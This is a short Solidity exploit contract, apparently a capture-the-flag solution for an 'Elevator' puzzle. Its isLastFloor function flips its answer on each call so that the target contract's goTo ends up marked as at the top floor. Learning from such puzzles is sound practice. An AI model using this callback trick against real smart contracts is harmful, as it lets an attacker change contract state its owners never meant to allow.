// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


interface IElevator {

  function goTo(uint _floor) external;
}

interface Building {
  function isLastFloor(uint) external returns (bool);
}


contract AttackerElevator is Building{

    IElevator victim;
    bool lastFloor;

    constructor(address _victim) payable {
        victim = IElevator(_victim);
        lastFloor = false;
    }

    function isLastFloor(uint) public override returns(bool){
        bool boolSent = lastFloor;
        lastFloor = ! lastFloor;
        return boolSent;
    }

    function reachTheTop() public {
        victim.goTo(42);
    }
}